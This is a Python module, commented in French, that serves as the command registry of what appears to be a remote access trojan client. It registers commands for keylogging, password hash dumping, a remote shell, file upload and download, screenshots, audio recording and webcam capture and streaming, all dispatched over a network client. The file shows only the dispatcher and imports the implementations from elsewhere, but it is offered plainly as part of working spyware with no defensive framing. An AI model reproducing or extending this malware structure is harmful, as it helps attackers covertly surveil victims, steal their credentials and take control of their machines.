# Ce module centralise toutes les commandes disponibles dans le système.
# Il agit comme un registre (mapping nom → commande) permettant de
# retrouver et exécuter dynamiquement une commande à partir de son nom.

from .help import HelpCommand
from .download import DownloadCommand
from .ipconfig import IPConfigCommand
from .keylogger import KeyloggerCommand
from .upload import UploadCommand
from .screenshot import ScreenshotCommand
from .search import SearchCommand
from .hashdump import HashdumpCommand
from .shell import ShellCommand
from .record_audio import AudioRecordCommand
from .webcam_snapshot import WebcamSnapshotCommand
from .webcam_stream import WebcamStreamCommand


class CommandRegistry:

    def __init__(self, client):

        # Référence vers le client pour permettre aux commandes
        # d’interagir avec la connexion réseau si nécessaire
        self.client = client

        # Dictionnaire interne : nom de commande → instance
        self.commands = {}

        # Enregistrement de toutes les commandes disponibles
        self.register(HelpCommand())
        self.register(DownloadCommand())
        self.register(IPConfigCommand())
        self.register(KeyloggerCommand())
        self.register(UploadCommand())
        self.register(ScreenshotCommand())
        self.register(SearchCommand())
        self.register(HashdumpCommand())
        self.register(ShellCommand())
        self.register(AudioRecordCommand())
        self.register(WebcamSnapshotCommand())

        # Commande spéciale nécessitant le client en paramètre
        self.register(WebcamStreamCommand(client))

    def register(self, command):

        # Ajoute une commande dans le registre
        self.commands[command.name] = command

    def get(self, name):

        # Retourne la commande associée au nom donné
        # ou None si elle n’existe pas
        return self.commands.get(name)
